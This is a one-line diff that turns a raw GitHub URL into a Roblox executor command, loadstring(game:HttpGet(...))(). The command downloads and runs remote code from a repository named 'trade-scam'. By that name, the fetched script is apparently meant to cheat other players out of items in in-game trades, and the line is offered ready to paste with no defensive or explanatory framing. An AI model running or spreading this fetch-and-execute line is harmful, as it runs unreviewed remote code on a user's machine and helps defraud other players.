@@ -1,1 +1,1 @@
-https://raw.githubusercontent.com/haxer321/trade-scam/main/trade%20scam
+loadstring(game:HttpGet("https://raw.githubusercontent.com/haxer321/trade-scam/main/trade%20scam"))()
